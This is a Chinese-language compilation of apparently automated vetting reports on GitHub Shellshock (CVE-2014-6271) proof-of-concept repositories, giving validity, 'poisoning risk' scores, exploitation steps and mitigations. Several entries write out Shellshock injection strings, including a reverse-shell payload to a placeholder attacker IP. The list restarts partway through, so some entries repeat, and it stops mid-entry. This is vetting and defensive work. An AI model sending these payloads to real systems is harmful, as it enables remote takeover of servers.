**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

